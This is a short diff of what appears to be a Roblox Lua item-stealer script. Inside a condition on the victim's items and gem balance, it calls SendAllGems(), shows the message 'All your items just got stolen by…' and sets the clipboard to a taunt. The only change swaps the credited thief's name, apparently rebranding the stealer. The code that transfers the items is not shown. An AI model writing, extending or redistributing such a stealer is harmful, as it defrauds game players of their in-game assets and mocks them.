@@ -363,7 +363,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
     SendAllGems()
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by TOB9K!\n  ")
+    message.Error("All your items just got stolen by Honzaj!\n  ")
     setclipboard("XD L ")
 end
 
